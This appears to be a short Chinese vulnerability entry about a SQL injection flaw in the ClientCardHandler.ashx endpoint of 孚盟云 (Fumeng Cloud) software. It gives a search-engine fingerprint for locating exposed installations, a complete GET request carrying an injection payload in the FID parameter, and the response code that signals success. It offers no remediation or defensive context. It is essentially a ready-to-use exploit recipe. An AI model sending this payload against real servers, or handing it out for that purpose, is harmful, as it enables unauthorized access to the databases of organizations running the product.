# 孚盟云ClientCardHandler.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`GET /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=1'+and+1=@@version-- HTTP/1.1`
- **响应特征**：200